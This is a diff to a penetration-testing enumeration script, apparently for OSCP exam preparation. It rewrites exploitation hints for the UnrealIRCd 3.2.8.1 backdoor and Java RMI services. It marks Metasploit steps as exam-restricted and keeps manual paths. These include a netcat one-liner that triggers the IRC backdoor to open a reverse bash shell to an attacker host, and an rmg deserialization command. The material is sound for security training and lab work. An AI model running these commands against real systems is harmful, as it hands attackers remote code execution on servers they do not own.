@@ -956,11 +956,13 @@ for IRC_PORT in 6667 6697; do
                 warn "CRITICAL: UnrealIRCd 3.2.8.1 detected — BACKDOOR vulnerability!"
                 warn "CVE: UnrealIRCd 3.2.8.1 remote code execution via AB; payload"
                 hint "UnrealIRCd 3.2.8.1 backdoor exploitation:
-    # Metasploit:
-    use exploit/unix/irc/unreal_ircd_3281_backdoor
-    set RHOSTS ${TARGET}; set RPORT ${IRC_PORT}; run
-    # Manual (netcat):
-    echo 'AB; bash -i >& /dev/tcp/<LHOST>/4444 0>&1' | nc ${TARGET} ${IRC_PORT}"
+    # ⚠️ OSCP: Metasploit limited to 1 machine per exam — prefer manual
+    # [MSF-RESTRICTED] Metasploit:
+    # use exploit/unix/irc/unreal_ircd_3281_backdoor
+    # set RHOSTS ${TARGET}; set RPORT ${IRC_PORT}; run
+    # Manual (OSCP-safe) — netcat one-liner:
+    echo 'AB; bash -i >& /dev/tcp/<LHOST>/4444 0>&1' | nc ${TARGET} ${IRC_PORT}
+    # Or standalone PoC: searchsploit -m 13853"
             fi || true
 
             # Run searchsploit on detected version
@@ -1005,11 +1007,12 @@ if has_port 1099; then
     rmg enum ${TARGET} 1099
     # List all bound names:
     rmg list ${TARGET} 1099
-    # Test deserialization (requires ysoserial):
+    # Test deserialization (requires ysoserial) — OSCP-safe manual path:
     rmg serial ${TARGET} 1099 CommonsCollections6 'id' --bound-name <name>
-    # Metasploit:
-    use exploit/multi/misc/java_rmi_server
-    set RHOSTS ${TARGET}; run"
+    # ⚠️ OSCP: Metasploit limited to 1 machine per exam
+    # [MSF-RESTRICTED] Metasploit alternative:
+    # use exploit/multi/misc/java_rmi_server
+    # set RHOSTS ${TARGET}; run"
     echo ""
 fi
 
